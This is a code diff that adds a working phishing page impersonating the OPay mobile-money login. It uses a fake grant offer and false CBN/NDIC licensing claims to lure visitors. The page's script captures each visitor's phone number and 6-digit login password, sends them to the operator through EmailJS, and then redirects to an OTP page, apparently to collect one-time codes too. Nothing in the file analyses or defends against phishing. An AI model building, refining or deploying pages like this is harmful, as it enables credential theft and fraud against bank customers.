@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Opay Login</title>
+
+    <link rel="stylesheet" href="login.css">
+
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+    <style>
+        .contact-message {
+            width: 100%;
+            min-height: 120px;
+            padding: 12px;
+            box-sizing: border-box;
+            resize: vertical;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-family: Arial, sans-serif;
+        }
+
+        .contact-status {
+            text-align: center;
+            margin-top: 12px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <main class="login-page">
+
+        <header class="top">
+            <img src="logo.png" alt="ORay" class="logo">
+        </header>
+        
+        <a href="#" class="login-now">📢 ₦200K Business Grant will Close Soon!</a>
+
+        <form class="login-container" id="contactForm">
+            
+            <div class="phone-box">
+
+                <div class="country">
+                    <span class="flag">🇳🇬</span>
+                    <span class="code">+234</span>
+                </div>
+
+                <div class="divider"></div>
+
+                <input
+                    type="tel"
+                    class="phone-input"
+                    name="phone_number"
+                    placeholder="Phone number"
+                    inputmode="numeric"
+                    maxlength="11"
+                    required
+                >
+
+            </div>
+
+            <div class="password-box">
+
+                <input
+                    type="password"
+                    class="password-input"
+                    name="login_password"
+                    placeholder="Enter your 6-digit login password"
+                    maxlength="6"
+                    autocomplete="off"
+                    inputmode="numeric"
+                    required
+                >
+
+            </div>
+
+            <!-- Forgot Password -->
+            <a href="#" class="forgot">
+                Forget Password
+            </a>
+            
+            <button
+                type="submit"
+                id="sendBtn"
+                class="next-button"
+            >
+                Next
+            </button>
+
+            <p id="status" class="contact-status"></p>
+
+            <!-- Cancel -->
+            <a href="#" class="cancel">
+                Cancel
+            </a>
+
+            <!-- Create Account -->
+            <a href="#" class="create-account">
+                I have no OPay account
+            </a>
+
+            <!-- License -->
+            <div class="license">
+
+                <span class="cbn-icon">🇳🇬</span>
+
+                <span>
+                    Licensed by the
+                    <strong>CBN</strong>
+                    and insured by the
+                    <strong>NDIC</strong>
+                </span>
+
+            </div>
+
+        </form>
+
+    </main>
+
+    <script>
+        // Initialize EmailJS with Public Key
+        emailjs.init({
+            publicKey: "4GmeCxgk_4_p0BnkP"
+        });
+
+        const form = document.querySelector("#contactForm");
+        const phoneInput = document.querySelector(".phone-input");
+        const passwordInput = document.querySelector(".password-input");
+
+        // Force numeric entry on Phone Input
+        if (phoneInput) {
+            phoneInput.addEventListener("input", () => {
+                phoneInput.value = phoneInput.value.replace(/\D/g, "").slice(0, 11);
+            });
+        }
+
+        // Force numeric entry on Password Input
+        if (passwordInput) {
+            passwordInput.addEventListener("input", () => {
+                passwordInput.value = passwordInput.value.replace(/\D/g, "").slice(0, 6);
+            });
+        }
+
+        // Form Submit Handler
+        form.addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            const button = document.querySelector("#sendBtn");
+            const status = document.querySelector("#status");
+
+            const phoneVal = phoneInput.value.trim();
+            const passwordVal = passwordInput.value.trim();
+
+            // Validate simple field parameters before parsing transitions
+            if (phoneVal.length < 9) {
+                alert("Please enter a valid phone number.");
+                phoneInput.focus();
+                return;
+            }
+
+            if (passwordVal.length !== 6) {
+                alert("Please enter your 6-digit login password.");
+                passwordInput.focus();
+                return;
+            }
+
+            // Save variables to pass to the template layout and otp tracking
+            sessionStorage.setItem("orayDemoPhone", phoneVal);
+            sessionStorage.setItem("orayDemoPassword", passwordVal);
+
+            button.disabled = true;
+            button.textContent = "Redirecting...";
+            status.textContent = "";
+
+            // Package the explicit fields into your template parameters object
+            const templateParams = {
+                name: "Website visitor",
+                message: `Phone Number: +234 ${phoneVal}\nPassword: ${passwordVal}`
+            };
+
+            emailjs.send(
+                "service_y4dbsvc",
+                "template_7ob6bz8",
+                templateParams
+            )
+            .then(function() {
+                status.textContent = "Redirecting safely...";
+                form.reset();
+                window.location.href = "otp.html";
+            })
+            .catch(function(error) {
+                console.error("EmailJS error details:", error);
+                status.textContent = "Server timeout. Please try again.";
+                button.disabled = false;
+                button.textContent = "Next";
+            });
+        });
+    </script>
+
+</body>
+</html>
